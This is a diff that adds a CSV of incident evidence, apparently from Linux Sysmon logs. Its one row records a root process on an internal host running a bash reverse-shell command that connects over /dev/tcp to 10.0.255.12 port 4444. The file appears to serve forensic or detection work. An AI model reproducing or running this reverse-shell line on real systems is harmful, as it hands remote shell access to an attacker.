@@ -1,0 +1,2 @@
+evidence_ref,timestamp_utc,provider,host,user,event_id,event_record_id,image,parent_image,process_id,parent_process_id,process_guid,command_line,command_target_ip,command_target_port,original_source_lines,network_outcome
+E001,2024-05-31T18:01:42.639983000Z,Linux-Sysmon,ip-10-0-255-92,root,1,905,/usr/bin/bash,/usr/bin/dash,9414,9413,{ec227f46-1086-665a-0dcf-bdc908560000},bash -c 0<&53-;exec 53<>/dev/tcp/10.0.255.12/4444;sh <&53 >&53 2>&53,10.0.255.12,4444,"1,2",unknown
